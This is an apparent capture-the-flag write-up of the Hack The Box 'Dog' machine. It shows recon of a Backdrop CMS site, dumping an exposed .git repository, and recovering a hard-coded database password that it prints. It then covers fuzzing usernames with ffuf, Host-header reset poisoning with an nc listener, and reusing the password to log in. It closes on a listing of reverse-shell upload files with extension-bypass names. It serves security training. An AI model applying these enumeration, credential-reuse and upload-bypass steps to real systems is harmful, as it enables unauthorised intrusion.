---
{"dg-publish":true,"permalink":"/ct-fs/htb/dog/","dgShowFileTree":true,"dg-note-properties":{}}
---

# By 0xCapra_Daemon aka Will Keller
#linux #git #BackDropCMS #sudo #bee

Dawg...
## Recon
![Pasted image 20260807125536.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807125536.png)

### Nmap:
```zsh
Scanning target 10.129.231.223
Time started: 2026-08-07 15:56:06.545526
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:34.873771
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.231.223 10.129.231.223
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.231.223 10.129.231.223
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 16:01 -0400
Nmap scan report for 10.129.231.223
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
-----------------------------------------------------------
```
Port scanning reveals ports open on 22 (ssh) and 80 (webserver). `nmap` enumeration of port 80 shows several interesting endpoints including `/robots.txt` and a repository at `/.git`




### Port 80
#### Manual Enumeration
![Pasted image 20260807130539.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807130539.png)
Visiting the webroot appears to be a site about dogs and care for dogs. It appears from the author name that it's using `BackDrop CMS`. 

![Pasted image 20260807130633.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807130633.png)
Visiting `/about` we do confirm it's running `Backdrop CMS` we also note the login button and the hostname to add to our `/etc/hosts` as `dog.htb`

![Pasted image 20260807130813.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807130813.png)
Clicking the login button submits a GET parameter `?q=user/login`. This might be an injectable parameter, but let's keep enumerating.

![Pasted image 20260807130943.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807130943.png)
Checking out the source code of `index` we are able to identify that it's running `Backdrop CMS 1`.

```html
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html
#
# For syntax checking, see:
# http://www.robotstxt.org/checker.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
---
/.git/
/core/
/profiles/
/README.md
/web.config
/admin
/comment/reply
/filter/tips
/node/add
/search
/user/register
/user/password
/user/login
/user/logout
/?q=admin
/?q=comment/reply
/?q=filter/tips
/?q=node/add
/?q=search
/?q=user/password
/?q=user/register
/?q=user/login
/?q=user/logou
```
Contents of `robots.txt`. We can use this to make a target-specific wordlist for enumeration, and we'll also include the `/.git/` repo we found in the portscan. Finally we'll add this list to a copy of `common.txt` from `seclists/Discovery/Web-Content/common.txt` so that `dirsearch` can go recursive and not end after identifying the first layer of these known paths from `robots.txt`.

### Dirsearch
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/dog/scanning]
└─$ dirsearch -u http://dog.htb -e php,html,txt,js,css,json,py,phtml,phar,php5,php3,php4 -w ./common.txt -r -f -F -x 404,403 -o ./dirsearch_robots
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt, js, css, json, py, phtml, phar, php5, php3, php4 | HTTP method: GET | Threads: 25 | Wordlist size: 64261

Output File: ./dirsearch_robots

Target: http://dog.htb/

[16:21:40] Starting: 
[16:21:43] 200 -   23B  - /.git/HEAD
[16:21:45] 200 -   92B  - /.git/config
[16:21:45] 200 -  601B  - /.git/
-->  http://dog.htb/.git
Added to the queue: .git/
[16:21:46] 200 -  473B  - /.git/logs/
Added to the queue: .git/logs/
[16:21:47] 200 -  337KB - /.git/index
[16:21:54] 200 -    7KB - /LICENSE.txt
[16:22:51] 200 -  605B  - /core/
Added to the queue: core/
[16:22:51] 200 -  605B  - /core/
-->  http://dog.htb/core
[16:23:32] 200 -  593B  - /files/
Added to the queue: files/
[16:23:32] 200 -  593B  - /files/
-->  http://dog.htb/files
[16:24:10] 200 -  453B  - /layouts/
Added to the queue: layouts/
[16:24:10] 200 -  453B  - /layouts/
-->  http://dog.htb/layouts
[16:24:28] 200 -  400B  - /modules/
Added to the queue: modules/
[16:24:28] 200 -  400B  - /modules/
-->  http://dog.htb/modules
[16:25:21] 200 -  528B  - /robots.txt
[16:25:31] 200 -    0B  - /settings.php
[16:25:37] 200 -  481B  - /sites/
Added to the queue: sites/
[16:25:37] 200 -  481B  - /sites/
-->  http://dog.htb/sites
[16:25:58] 200 -  451B  - /themes/
Added to the queue: themes/
[16:25:58] 200 -  451B  - /themes/
-->  http://dog.htb/themes
[16:26:38] 200 -    5KB - /README.md
[16:26:39] 200 -    4KB - /?q=filter/tips/
[16:26:39] 200 -    4KB - /?q=filter/tips
[16:26:39] 200 -    3KB - /?q=user/password
[16:26:39] 200 -    3KB - /?q=user/password/
[16:26:40] 200 -    3KB - /?q=user/login
[16:26:40] 200 -    3KB - /?q=user/login/

[16:26:40] Starting: .git/
[16:28:37] 200 -  648B  - /.git/hooks/
Added to the queue: .git/hooks/
[16:28:38] 200 -  648B  - /.git/hooks/
-->  http://dog.htb/.git/hooks
[16:28:45] 200 -  453B  - /.git/info/
Added to the queue: .git/info/
[16:28:45] 200 -  453B  - /.git/info/
-->  http://dog.htb/.git/info
[16:29:04] 200 -  473B  - /.git/logs/
-->  http://dog.htb/.git/logs
[16:29:27] 200 -    2KB - /.git/objects/
Added to the queue: .git/objects/
[16:29:27] 200 -    2KB - /.git/objects/
-->  http://dog.htb/.git/objects

[16:31:30] Starting: .git/logs/

[16:36:19] Starting: core/
[16:38:36] 200 -    1KB - /core/includes/
Added to the queue: core/includes/
[16:38:36] 200 -    1KB - /core/includes/
-->  http://dog.htb/core/includes
[16:38:39] 200 - 1005B  - /core/install.php
[16:38:54] 200 -  551B  - /core/layouts/
-->  http://dog.htb/core/layouts
[16:38:54] 200 -  551B  - /core/layouts/
Added to the queue: core/layouts/
[16:39:14] 200 -    2KB - /core/misc/
Added to the queue: core/misc/
[16:39:14] 200 -    2KB - /core/misc/
-->  http://dog.htb/core/misc
[16:39:16] 200 -  815B  - /core/modules/
Added to the queue: core/modules/
[16:39:17] 200 -  815B  - /core/modules/
-->  http://dog.htb/core/modules
[16:39:59] 200 -  521B  - /core/profiles/
Added to the queue: core/profiles/
[16:39:59] 200 -  521B  - /core/profiles/
-->  http://dog.htb/core/profiles
[16:40:23] 200 -  585B  - /core/scripts/
Added to the queue: core/scripts/
[16:40:23] 200 -  585B  - /core/scripts/
-->  http://dog.htb/core/scripts
[16:40:56] 200 -  488B  - /core/themes/
Added to the queue: core/themes/
[16:40:56] 200 -  488B  - /core/themes/
-->  http://dog.htb/core/themes

[16:41:40] Starting: files/
[16:42:57] 200 -    3KB - /files/css/
Added to the queue: files/css/
[16:42:57] 200 -    3KB - /files/css/
-->  http://dog.htb/files/css
[16:43:23] 200 -  446B  - /files/field/
Added to the queue: files/field/
[16:43:23] 200 -  446B  - /files/field/
-->  http://dog.htb/files/field
[16:44:05] 200 -    3KB - /files/js/
Added to the queue: files/js/
[16:44:06] 200 -    3KB - /files/js/
-->  http://dog.htb/files/js
[16:45:56] 200 -  501B  - /files/styles/
Added to the queue: files/styles/
[16:45:56] 200 -  501B  - /files/styles/
-->  http://dog.htb/files/styles
[16:46:46] 200 -  112B  - /files/README.md

[16:46:47] Starting: layouts/
[16:52:43] 200 -    1KB - /layouts/README.md

[16:52:45] Starting: modules/

[16:58:36] Starting: sites/
[17:02:43] 200 -    0B  - /sites/sites.php
[17:03:47] 200 -    3KB - /sites/README.md

[17:03:48] Starting: themes/
[17:08:41] 200 -    1KB - /themes/README.md

[17:08:42] Starting: .git/hooks/

[17:13:25] Starting: .git/info/
[17:14:58] 200 -  240B  - /.git/info/exclude

[17:18:31] Starting: .git/objects/
[17:18:34] 200 -  894B  - /.git/objects/00/
Added to the queue: .git/objects/00/
[17:18:34] 200 -  894B  - /.git/objects/00/
-->  http://dog.htb/.git/objects/00
[17:18:34] 200 -  859B  - /.git/objects/01/
Added to the queue: .git/objects/01/
[17:18:34] 200 -  859B  - /.git/objects/01/
-->  http://dog.htb/.git/objects/01
[17:18:34] 200 -  996B  - /.git/objects/02/
Added to the queue: .git/objects/02/
[17:18:34] 200 -  996B  - /.git/objects/03/
[17:18:34] 200 -  996B  - /.git/objects/02/
-->  http://dog.htb/.git/objects/02
Added to the queue: .git/objects/03/
[17:18:34] 200 -  996B  - /.git/objects/03/
-->  http://dog.htb/.git/objects/03
[17:18:34] 200 -  929B  - /.git/objects/04/
Added to the queue: .git/objects/04/
[17:18:34] 200 -  750B  - /.git/objects/05/
Added to the queue: .git/objects/05/
[17:18:34] 200 -  929B  - /.git/objects/04/
-->  http://dog.htb/.git/objects/04
[17:18:34] 200 -  750B  - /.git/objects/05/
-->  http://dog.htb/.git/objects/05
[17:18:34] 200 -    1KB - /.git/objects/06/
Added to the queue: .git/objects/06/
[17:18:34] 200 -  985B  - /.git/objects/07/
Added to the queue: .git/objects/07/
[17:18:34] 200 -    1KB - /.git/objects/06/
-->  http://dog.htb/.git/objects/06
[17:18:34] 200 -  985B  - /.git/objects/07/
-->  http://dog.htb/.git/objects/07
[17:18:34] 200 -  927B  - /.git/objects/08/
Added to the queue: .git/objects/08/
[17:18:34] 200 -  863B  - /.git/objects/09/
Added to the queue: .git/objects/09/
[17:18:34] 200 -  927B  - /.git/objects/08/
-->  http://dog.htb/.git/objects/08
[17:18:34] 200 -  863B  - /.git/objects/09/
-->  http://dog.htb/.git/objects/09
[17:18:35] 200 -  925B  - /.git/objects/10/
Added to the queue: .git/objects/10/
[17:18:35] 200 -  925B  - /.git/objects/10/
-->  http://dog.htb/.git/objects/10
[17:18:35] 200 -  783B  - /.git/objects/11/
Added to the queue: .git/objects/11/
[17:18:35] 200 -  783B  - /.git/objects/11/
-->  http://dog.htb/.git/objects/11
[17:18:35] 200 -  963B  - /.git/objects/12/
Added to the queue: .git/objects/12/
[17:18:35] 200 -  963B  - /.git/objects/12/
-->  http://dog.htb/.git/objects/12
[17:18:35] 200 -    1KB - /.git/objects/13/
Added to the queue: .git/objects/13/
[17:18:35] 200 -  638B  - /.git/objects/14/
Added to the queue: .git/objects/14/
[17:18:35] 200 -    1KB - /.git/objects/13/
-->  http://dog.htb/.git/objects/13
[17:18:35] 200 -  638B  - /.git/objects/14/
-->  http://dog.htb/.git/objects/14
[17:18:35] 200 -  892B  - /.git/objects/15/
Added to the queue: .git/objects/15/
[17:18:35] 200 -  892B  - /.git/objects/15/
-->  http://dog.htb/.git/objects/15
[17:18:36] 200 -  819B  - /.git/objects/20/
Added to the queue: .git/objects/20/
[17:18:36] 200 -  819B  - /.git/objects/20/
-->  http://dog.htb/.git/objects/20
[17:18:38] 200 -  961B  - /.git/objects/21/
Added to the queue: .git/objects/21/
[17:18:38] 200 -  783B  - /.git/objects/22/
Added to the queue: .git/objects/22/
[17:18:38] 200 -  961B  - /.git/objects/21/
-->  http://dog.htb/.git/objects/21
[17:18:38] 200 -  783B  - /.git/objects/22/
-->  http://dog.htb/.git/objects/22
[17:18:39] 200 -    1KB - /.git/objects/23/
Added to the queue: .git/objects/23/
[17:18:39] 200 -  820B  - /.git/objects/24/
Added to the queue: .git/objects/24/
[17:18:39] 200 -    1KB - /.git/objects/23/
-->  http://dog.htb/.git/objects/23
[17:18:39] 200 -    1KB - /.git/objects/25/
[17:18:39] 200 -  820B  - /.git/objects/24/
-->  http://dog.htb/.git/objects/24
Added to the queue: .git/objects/25/
[17:18:39] 200 -    1KB - /.git/objects/25/
-->  http://dog.htb/.git/objects/25
[17:18:39] 200 -  824B  - /.git/objects/30/
Added to the queue: .git/objects/30/
[17:18:39] 200 -  824B  - /.git/objects/30/
-->  http://dog.htb/.git/objects/30
[17:18:39] 200 -  712B  - /.git/objects/32/
Added to the queue: .git/objects/32/
[17:18:39] 200 -  712B  - /.git/objects/32/
-->  http://dog.htb/.git/objects/32
[17:18:40] 200 -    1KB - /.git/objects/42/
Added to the queue: .git/objects/42/
[17:18:40] 200 -    1KB - /.git/objects/42/
-->  http://dog.htb/.git/objects/42
[17:18:40] 200 -  999B  - /.git/objects/50/
Added to the queue: .git/objects/50/
[17:18:40] 200 -  999B  - /.git/objects/50/
-->  http://dog.htb/.git/objects/50
[17:18:40] 200 -  754B  - /.git/objects/51/
Added to the queue: .git/objects/51/
[17:18:40] 200 -  754B  - /.git/objects/51/
-->  http://dog.htb/.git/objects/51
[17:18:40] 200 -  753B  - /.git/objects/64/
Added to the queue: .git/objects/64/
[17:18:40] 200 -  753B  - /.git/objects/64/
-->  http://dog.htb/.git/objects/64
[17:18:41] 200 -  998B  - /.git/objects/96/
Added to the queue: .git/objects/96/
[17:18:41] 200 -  998B  - /.git/objects/96/
-->  http://dog.htb/.git/objects/96
[17:19:02] 200 -  857B  - /.git/objects/aa/
Added to the queue: .git/objects/aa/
[17:19:02] 200 -  857B  - /.git/objects/aa/
-->  http://dog.htb/.git/objects/aa
[17:19:03] 200 -    1KB - /.git/objects/ac/
Added to the queue: .git/objects/ac/
[17:19:03] 200 -    1KB - /.git/objects/ac/
-->  http://dog.htb/.git/objects/ac
[17:19:06] 200 -  958B  - /.git/objects/ad/
[17:19:06] 200 -  958B  - /.git/objects/ad/
-->  http://dog.htb/.git/objects/ad
Added to the queue: .git/objects/ad/
[17:19:13] 200 -  820B  - /.git/objects/af/
Added to the queue: .git/objects/af/
[17:19:13] 200 -  820B  - /.git/objects/af/
-->  http://dog.htb/.git/objects/af
[17:19:29] 200 -  997B  - /.git/objects/b1/
Added to the queue: .git/objects/b1/
[17:19:29] 200 -  997B  - /.git/objects/b1/
-->  http://dog.htb/.git/objects/b1
[17:19:32] 200 -  964B  - /.git/objects/bb/
Added to the queue: .git/objects/bb/
[17:19:32] 200 -  964B  - /.git/objects/bb/
-->  http://dog.htb/.git/objects/bb
[17:19:33] 200 -  858B  - /.git/objects/bc/
[17:19:33] 200 -    1KB - /.git/objects/bd/
Added to the queue: .git/objects/bc/
Added to the queue: .git/objects/bd/
[17:19:33] 200 -  858B  - /.git/objects/bc/
-->  http://dog.htb/.git/objects/bc
[17:19:33] 200 -    1KB - /.git/objects/bd/
-->  http://dog.htb/.git/objects/bd
[17:19:33] 200 -  860B  - /.git/objects/be/
Added to the queue: .git/objects/be/
[17:19:33] 200 -  860B  - /.git/objects/be/
-->  http://dog.htb/.git/objects/be
[17:19:43] 200 -  927B  - /.git/objects/ca/
Added to the queue: .git/objects/ca/
[17:19:43] 200 -  927B  - /.git/objects/ca/
-->  http://dog.htb/.git/objects/ca
[17:19:49] 200 -  960B  - /.git/objects/cc/
[17:19:49] 200 -  962B  - /.git/objects/cb/
Added to the queue: .git/objects/cc/
Added to the queue: .git/objects/cb/
[17:19:49] 200 -  962B  - /.git/objects/cb/
-->  http://dog.htb/.git/objects/cb
[17:19:49] 200 -  960B  - /.git/objects/cc/
-->  http://dog.htb/.git/objects/cc
[17:19:49] 200 -  853B  - /.git/objects/cd/
Added to the queue: .git/objects/cd/
[17:19:49] 200 -  853B  - /.git/objects/cd/
-->  http://dog.htb/.git/objects/cd
[17:19:50] 200 -  787B  - /.git/objects/cf/
Added to the queue: .git/objects/cf/
[17:19:50] 200 -  787B  - /.git/objects/cf/
-->  http://dog.htb/.git/objects/cf
[17:20:19] 200 -  999B  - /.git/objects/da/
Added to the queue: .git/objects/da/
[17:20:19] 200 -  999B  - /.git/objects/da/
-->  http://dog.htb/.git/objects/da
[17:20:21] 200 -  852B  - /.git/objects/db/
Added to the queue: .git/objects/db/
[17:20:21] 200 -  852B  - /.git/objects/db/
-->  http://dog.htb/.git/objects/db
[17:20:22] 200 -    1KB - /.git/objects/dc/
Added to the queue: .git/objects/dc/
[17:20:22] 200 -    1KB - /.git/objects/dc/
-->  http://dog.htb/.git/objects/dc
[17:20:23] 200 -    1KB - /.git/objects/de/
Added to the queue: .git/objects/de/
[17:20:23] 200 -    1KB - /.git/objects/de/
-->  http://dog.htb/.git/objects/de
[17:20:28] 200 -  896B  - /.git/objects/df/
Added to the queue: .git/objects/df/
[17:20:28] 200 -  896B  - /.git/objects/df/
-->  http://dog.htb/.git/objects/df
[17:20:40] 200 -  993B  - /.git/objects/ec/
Added to the queue: .git/objects/ec/
[17:20:40] 200 -  993B  - /.git/objects/ec/
-->  http://dog.htb/.git/objects/ec
[17:20:42] 200 -  857B  - /.git/objects/ee/
Added to the queue: .git/objects/ee/
[17:20:42] 200 -  857B  - /.git/objects/ee/
-->  http://dog.htb/.git/objects/ee
[17:20:57] 200 -  962B  - /.git/objects/fa/
Added to the queue: .git/objects/fa/
[17:20:57] 200 -  962B  - /.git/objects/fa/
-->  http://dog.htb/.git/objects/fa
[17:20:59] 200 -  787B  - /.git/objects/fb/
Added to the queue: .git/objects/fb/
[17:20:59] 200 -  787B  - /.git/objects/fb/
-->  http://dog.htb/.git/objects/fb
[17:20:59] 200 -  856B  - /.git/objects/fc/
Added to the queue: .git/objects/fc/
[17:20:59] 200 -  856B  - /.git/objects/fc/
-->  http://dog.htb/.git/objects/fc
[17:21:45] 200 -  409B  - /.git/objects/info/
Added to the queue: .git/objects/info/
[17:21:45] 200 -  409B  - /.git/objects/info/
-->  http://dog.htb/.git/objects/info
[17:23:00] 200 -  410B  - /.git/objects/pack/
Added to the queue: .git/objects/pack/
[17:23:00] 200 -  410B  - /.git/objects/pack/
-->  http://dog.htb/.git/objects/pack

[17:25:09] Starting: core/includes/
[17:26:22] 200 -  604B  - /core/includes/database/
Added to the queue: core/includes/database/
[17:26:22] 200 -  604B  - /core/includes/database/
-->  http://dog.htb/core/includes/database

[17:31:14] Starting: core/layouts/
[17:34:02] 200 -  498B  - /core/layouts/legacy/
Added to the queue: core/layouts/legacy/
[17:34:03] 200 -  498B  - /core/layouts/legacy/
-->  http://dog.htb/core/layouts/legacy
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue / [n]ext: q 
[s]ave / [q]uit without saving: q
```


### Manual Enumeration (cont.)
![Pasted image 20260807133715.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807133715.png)
Inputting the username `admin` and `admin` as the password to check for LHF we see the error tells us that our user is incorrect. This may be a vector for us to fuzz valid usernames on the machine.

![Pasted image 20260807133843.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807133843.png)
Back on the homepage we see an article written by `dogBackDropSystem` as the author. We may be able to use this user name to login. 

![Pasted image 20260807133939.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807133939.png)
Just like we thought, it's a valid user on the machine.

![Pasted image 20260807134338.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807134338.png)
I'm going to try to reset the user's password and intercept the request in `caido` to see if it will leak the link or some other sensitive data.

![Pasted image 20260807134759.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807134759.png)
After a series of redirects with our POST request to change `dogBackDropSystem` password, the system redirects us back to the login page stating it cannot send the email for this account. Analysis of the original POST data does not show a place to inject an email address.

![Pasted image 20260807135022.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807135022.png)
Online research reveals an advisory for a [CVE](https://github.com/advisories/GHSA-ffpg-gm3h-4p5p) related to our target CMS. It states that attackers can manipulate the `Host:` header to redirect to malicious attacker controlled sites and possibly session steal via cookie injection.

![Pasted image 20260807135408.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807135408.png)
`exploit-db` also has an entry for a stored [XSS vuln](https://www.exploit-db.com/exploits/51597) for some an authenticated user on affected versions of our CMS as well.

There's also a fairly recent [CVE](https://www.sentinelone.com/vulnerability-database/cve-2025-27822/) that allows an authorization bypass utilizing the "Masquerade as" feature of the CMS.
>[!info]
>![Pasted image 20260807135621.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807135621.png)
>If this is enabled, a lower privilege user may have the ability to "masquerade as" an admin user.

![Pasted image 20260807135732.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807135732.png)
There's also an advisory for our CMS version that allows an unrestricted file upload vuln. According to this [poc](https://vulners.com/packetstorm/PACKETSTORM:189764) it also requires an authenticated session and may even require an admin session as it depends on accessing `/admin`.

### Git Enumeration
I also went ahead and exfiltrated the git repo with `wget -np -r 'http://dog.htb/.git'`
```zsh
FINISHED --2026-08-07 16:42:28--
Total wall clock time: 9m 49s
Downloaded: 5682 files, 22M in 32s (706 KB/s
```

```zsh
; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```
Combing through this massive repo we were able to glean the full version number of `BackDrop 1.27.1` Which means that our identified CVEs may not work except the header injection vuln. 

>[!info]
>![Pasted image 20260807142057.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807142057.png)
>PortSwigger explains this as a "password reset" variant of a Header injection attack. By injecting a server we control into the `Host:` header we can redirect a reset email link to us directly.

We'll try this on the identified admin user and fuzz for more valid users if needed.

![Pasted image 20260807143725.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807143725.png)
As you can see we get a bunch of encrypted data upon injecting. `Caido` also errors following the redirects because it's looking for our server on port 443 instead. We will re do this under that consideration.







## Initial Access


![Pasted image 20260807202637.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807202637.png)
```zsh
nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.14.192] from (UNKNOWN) [10.10.14.192] 57946
GET /?q=user HTTP/1.1
Host: 10.10.14.192:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dog.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
![Pasted image 20260807204716.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807204716.png)
Valid user `john` identified in `burp intruder`. Since the error is verbose we can validate users for possible host header injection attacks.

![valid users 1.png](/img/user/CTFs/HTB/Images/Dog%20Images/valid%20users%201.png)
Since we know the author `dogBackDropSystem` is valid we place it at the top of our attack list and then fire off common male names. `john` gave a similar sized response where as the others, which are confirmed invalid, are quite smaller and lo and behold, `john` is a valid user as seen above.

Deadend. Back to the Git repo

```zsh
					} else if (level > 1 || $root.hasClass('sm-vertical')) {
+					if (level == 1 && $root.hasClass('sm-vertical')) {
+					} else if ((level == 1 || obj.activatedItems[level - 1] && (!obj.activatedItems[level - 1].dataSM('sub') || !obj.activatedItems[level - 1].dataSM('sub').is(':visible') || obj.activatedItems[level - 1].dataSM('sub').hasClass('mega-menu'))) && !$root.hasClass('sm-vertical')) {
+								getFirstItemLink($root).focusSM();
+						if (level == 1 && !$root.hasClass('sm-vertical') && !obj.opts.bottomToTopSubMenus) {
+						} else if (level > 1 || $root.hasClass('sm-vertical')) {
+			$(document).on('keydown.smartmenus' + this.rootId, function(e) {
+						getFirstItemLink(self.$root).focusSM();
+ *   - item: The root tab jQuery element
+ *   - item: The root tab jQuery element
+# This file will be ignored unless it is at the root of your host:
+$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+ * contents of a file outside your docroot that is never saved together
+root directory. Each site will always have a different database, configuration,
                                                                                   
```
Enumerating with `git show | grep root` we see a password that the system uses on the db. We can try to use password reuse on it. None of our currently identified users use this password though.

![Pasted image 20260807220920.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807220920.png)
We have another validation endpoint. Testing with `john` we get an access denied error rather than `404`. We'll fuzz this in `ffuf` to find valid users.

```zsh
ffuf -c -v -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://dog.htb/?q=accounts/FUZZ -mc 403 | tee ../scanning/user_enum

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dog.htb/?q=accounts/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 403
________________________________________________

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 162ms]
| URL | http://dog.htb/?q=accounts/john
    * FUZZ: john

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 319ms]
| URL | http://dog.htb/?q=accounts/tiffany
    * FUZZ: tiffany

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 118ms]
| URL | http://dog.htb/?q=accounts/John
    * FUZZ: John

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 104ms]
| URL | http://dog.htb/?q=accounts/morris
    * FUZZ: morris

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 126ms]
| URL | http://dog.htb/?q=accounts/axel
    * FUZZ: axel

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 169ms]
| URL | http://dog.htb/?q=accounts/JOHN
    * FUZZ: JOHN

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 106ms]
| URL | http://dog.htb/?q=accounts/rosa
    * FUZZ: rosa

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 338ms]
| URL | http://dog.htb/?q=accounts/Morris
    * FUZZ: Morris

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 279ms]
| URL | http://dog.htb/?q=accounts/Tiffany
    * FUZZ: Tiffany


```
![Pasted image 20260807222803.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807222803.png)
We identify that www-data is running this application in the background.



![Pasted image 20260807220101.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807220101.png)
Successfully authenticate to BackDrop with user `tiffany` using the stolen db password.

![Pasted image 20260807220546.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807220546.png)
Navigating to the users page we get a full list matching most of our hits on `ffuf`.

![Pasted image 20260807223501.png](/img/user/CTFs/HTB/Images/Dog%20Images/Pasted%20image%2020260807223501.png)
Let's see if we can add a reverse shell in the content add file section.

```zsh
──(kali㉿kali)-[~/…/ctf/htb/dog/exploit]
└─$ ls
total 4.3M
4.0K drwxrwxr-x 3 kali kali 4.0K Aug  8 01:58  .
4.0K drwxrwxr-x 6 kali kali 4.0K Aug  8 01:58  ..
4.2M -rw-rw-r-- 1 kali kali 4.2M Aug  8 01:54  lateral.tar.gz
8.0K -rwxr-xr-x 1 kali kali 5.4K Aug  8 01:42  rev.jpg.php
8.0K -rwxr-xr-x 1 kali kali 5.4K Aug  8 01:34  rev.php
8.0K -rwxr-xr-x 1 kali kali 5.4K Aug  8 01:37  rev.php%00.jpg
8.0K -rwxr-xr-x 1 kali kali 5.4K Aug  8 01:38 'rev.php .jpg'
